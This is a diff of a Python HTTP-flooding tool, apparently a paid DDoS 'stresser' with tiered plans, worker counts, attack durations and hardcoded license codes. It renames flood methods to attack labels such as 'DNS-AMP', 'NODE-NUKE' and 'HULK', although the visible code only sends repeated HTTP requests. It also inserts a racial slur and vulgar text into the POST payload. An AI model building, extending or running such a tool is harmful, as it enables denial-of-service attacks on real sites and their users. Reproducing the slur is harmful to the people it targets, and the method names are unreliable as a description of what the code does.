@@ -44,18 +44,17 @@ current_color = COLORS['bcyan']
 current_name  = 'Bright Cyan'
 
 ASCII_MENUS = {
-    'star': """⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢶⣦⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠤⠒⢀⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⠃
-⠀⠀⠀⠀⠀⢀⣠⣴⠶⡛⢉⣀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⣴⣿⠟⠁⠀
-⠀⠀⣀⣤⡾⠟⠋⠀⡈⠉⠙⠛⠻⢿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠋⠉⢀⣠⣴⠟⠋⠁⠀⠀⠀
-⢠⣾⡿⠋⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠙⣿⣿⣿⡿⠋⠀⢀⣠⠴⠚⠋⠉⠀⠀⠀⠀⠀⠀⠀
-⣿⣿⠁⠀⠀⠀⢀⣸⣧⡀⠀⠀⠀⠀⠀⠘⣿⣿⠧⠒⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠈⠛⠳⠦⠀⠈⠙⢿⣿⠛⠉⠀⠀⠀⠀⠀⢻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
+    'devil': """
+      ⢸⣿⣧⡀⠀⣠⣴⣶⣶⣶⣶⣶⣦⣤⣀⠀⣰⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠨⣿⣿⣷⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣵⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢘⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⣿⣿⣿⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀ ⢻⣿⣿⣷⣦⣀⣉⣽⣿⣿⣿⣿⣍⣁⣠⣾⣿⣿⣿⠁⠀⠀⠀⠀⣀⣀⡙⣷⣦⣄⠀⠀⠀
+⠀⠀⠀  ⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⢀⣠⣴⣾⠿⠟⣛⣭⣿⡿⠿⢿⣦⡀
+⠀  ⠀⠀⠀ ⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣅⣴⣿⡿⠟⠁⠀⠀⢸⠭⠋⠁⠀⠀⠀⠀
+⠀ ⠀⠀⠀⠀⠀ ⠀⠉⠛⠿⣿⣿⣿⣿⣿⡿⠟⠋⣹⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""",
     'bomb drop': """⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣀⡀⠀⠀⠠⡀⠀⠀⣿⣷⣆⣀⣤⣶⣿⣿⡿⠋⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡫⡳⣄⢰⣿⣿⣮⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀
@@ -119,35 +118,35 @@ ASCII_MENUS = {
 /_/ |_/\___/\__/ """,
 }
 
-current_ascii = 'star'
+current_ascii = 'devil'
 
 PLANS = {
     'FREE': {
         'name': 'Free Plan',
         'workers': 100,
         'duration': 120,
-        'methods': ['HTTP GET', 'HTTPS POST','STRESS TEST'],
+        'methods': ['HTTP GET', 'HTTPS POST','STRESS TEST','GET/POST MIX'],
         '76034a9f5bef30b9dee701711d30bed6': ['8k3n9p2m', 'q7w4e1r6', 'a5s8d3f2']
     },
     'HARD': {
         'name': 'Hard Plan',
         'workers': 250,
         'duration': 300,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'RAPID FIRE', 'STRESS TEST'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'DNS-AMP', 'STRESS TEST','SOCKET-AMP'],
         '76034a9f5bef30b9dee701711d30bed6': ['h4k9j2n7', 'x6c8v1b3', 'm9n2b5v4','6.4']
     },
     'PRO': {
         'name': 'Pro Plan',
         'workers': 1000,
         'duration': 3600,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'RAPID FIRE', 'STRESS TEST', 'BURST MODE', 'CONCURRENT FLOOD'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD','SOCKET-AMP'],
         '76034a9f5bef30b9dee701711d30bed6': ['p3r7o9k2', 'l8i4u6y1', 't5g9h3j7']
     },
     'VIP': {
         'name': 'VIP Plan',
-        'workers': 12000,
+        'workers': 1500,
         'duration': 9500,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'CUSTOM HEADERS', 'BULK REQUEST', 'RAPID FIRE', 'STRESS TEST', 'BURST MODE', 'CONCURRENT FLOOD', 'SOCKET PRESSURE', 'AMPLIFIED LOAD'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD', 'TLS-VIP' ,'SOCKET-AMP','NET-BYPASS'],
         '76034a9f5bef30b9dee701711d30bed6': ['v9i2p8k4', 'z7x3c6v1', 'w4q8e2r5','xyz','.']
     }
 }
@@ -361,7 +360,7 @@ async def http_worker(session, url, end_time, worker_id, method):
     
     headers = {'User-Agent': user_agent}
     
-    if method in ['CUSTOM HEADERS', 'BULK REQUEST']:
+    if method in ['BROWSER', 'HULK']:
         headers.update({
             'X-Test-ID': f'worker-{worker_id}',
             'X-Load-Test': 'true'
@@ -392,7 +391,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                 post_url = url
                 if method == 'HTTP POST':
                     post_url = url.replace('https://', 'http://')
-                data = {'test': 'data', 'worker_id': worker_id, 'timestamp': time.time()}
+                data = {'niggadih': 'cumdata', 'bot_id': worker_id, 'timestamp': time.time()}
                 async with session.post(post_url, headers=headers, json=data, timeout=10) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
@@ -425,7 +424,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                         stats["status_codes"][resp.status] += 1
                         stats["requests"] += 1
                         
-            elif method in ['CUSTOM HEADERS', 'BULK REQUEST']:
+            elif method in ['BROWSER', 'HULK']:
                 async with session.get(url, headers=headers, timeout=10) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
@@ -433,7 +432,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                     stats["status_codes"][resp.status] += 1
                     stats["requests"] += 1
                     
-            elif method == 'RAPID FIRE':
+            elif method == 'DNS-AMP':
                 async with session.get(url, headers=headers, timeout=8) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
@@ -448,14 +447,14 @@ async def http_worker(session, url, end_time, worker_id, method):
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
-            elif method == 'BURST MODE':
+            elif method == 'NODE-NUKE':
                 for _ in range(3):
                     async with session.get(url, headers=headers, timeout=8) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
-            elif method == 'CONCURRENT FLOOD':
+            elif method == 'CONCURRENT HOLD':
                 for _ in range(2):
                     if random.random() > 0.5:
                         async with session.get(url, headers=headers, timeout=8) as resp:
@@ -468,14 +467,14 @@ async def http_worker(session, url, end_time, worker_id, method):
                             stats["requests"] += 1
                             stats["status_codes"][resp.status] += 1
                             
-            elif method == 'SOCKET PRESSURE':
+            elif method == 'SOCKET-AMP':
                 for _ in range(4):
                     async with session.get(url, headers=headers, timeout=10) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
-            elif method == 'AMPLIFIED LOAD':
+            elif method == 'BYPASS LOAD':
                 for _ in range(5):
                     async with session.get(url, headers=headers, timeout=8) as resp:
                         await resp.read()
@@ -485,7 +484,7 @@ async def http_worker(session, url, end_time, worker_id, method):
         except Exception:
             stats["errors"] += 1
 
-        if method in ['RAPID FIRE', 'STRESS TEST', 'BURST MODE', 'CONCURRENT FLOOD', 'SOCKET PRESSURE', 'AMPLIFIED LOAD']:
+        if method in ['DNS-AMP', 'STRESS TEST', 'NODE-NUKE', 'CONCURRENT HOLD', 'SOCKET-AMP', 'BYPASS LOAD']:
             await asyncio.sleep(random.uniform(0.1, 0.5))
         else:
             await asyncio.sleep(random.uniform(0.5, 2.0))
@@ -682,7 +681,6 @@ def plan_and_license():
     
     print(f"{current_color}  Current:{RESET}")
     print(f"    Plan: {plan_info['name']}")
-    print(f"    Code: {current_license['code']}")
     print(f"    Expires: {current_license['expires'].strftime('%Y-%m-%d')} ({days_left} days left)")
     
     print(f"\n{current_color}{BOLD}  Available Plans:{RESET}\n")
